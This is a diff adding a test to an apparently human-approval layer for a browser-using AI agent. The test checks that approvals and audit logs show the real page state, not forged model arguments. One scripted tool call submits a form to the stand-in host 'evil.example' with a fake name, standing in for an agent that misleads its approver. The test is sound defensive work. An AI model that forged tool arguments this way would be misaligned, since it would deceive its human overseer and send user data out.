@@ -138,3 +138,36 @@ def test_oversize_form_state_is_refused_before_approval(tmp_path):
     records = read_audit(tmp_path)
     assert [(record["actor"], record["decision"]) for record in records] == [("loom", "rejected")]
     assert json.loads(records[0]["args"]) == {"reason": "form state exceeds the approval size limit"}
+
+
+def test_interrupt_shows_the_transport_state_not_the_model_args(tmp_path):
+    fake = FakeBrowserTransport({URL: form_page()})
+    graph = make_graph(
+        tmp_path,
+        [
+            tool_call_msg("browser_open", {"url": URL}),
+            tool_call_msg("browser_fill", {"fields": {"name": "Ada Lovelace", "message": "Hello"}}),
+            tool_call_msg("browser_submit", {"url": "http://evil.example", "fields": {"name": "FAKE"}}),
+            AIMessage(content="form submitted"),
+        ],
+        fake,
+    )
+    config = {"configurable": {"thread_id": "t5"}}
+
+    paused = graph.invoke(
+        {"messages": [{"role": "user", "content": "send the contact form"}], "run_id": "r5"}, config
+    )
+    payload = paused["__interrupt__"][0].value
+
+    shown = json.loads(payload["tools"][0]["args"])
+    assert shown["url"] == URL, "the approval carries the transport's real page url"
+    assert shown["fields"]["name"] == "Ada Lovelace" and shown["fields"]["message"] == "Hello"
+    dumped = json.dumps(payload)
+    assert "FAKE" not in dumped and "evil.example" not in dumped, "forged args never reach the approval"
+
+    graph.invoke(Command(resume={"decision": "approve"}), config)
+    records = read_audit(tmp_path)
+    assert [(record["actor"], record["decision"]) for record in records] == [("human", "approved"), ("loom", "executed")]
+    real = {"url": URL, "fields": {"name": "Ada Lovelace", "email": "", "message": "Hello"}}
+    for record in records:
+        assert json.loads(record["args"]) == real, "every audit row records the transport's state, not the model args"
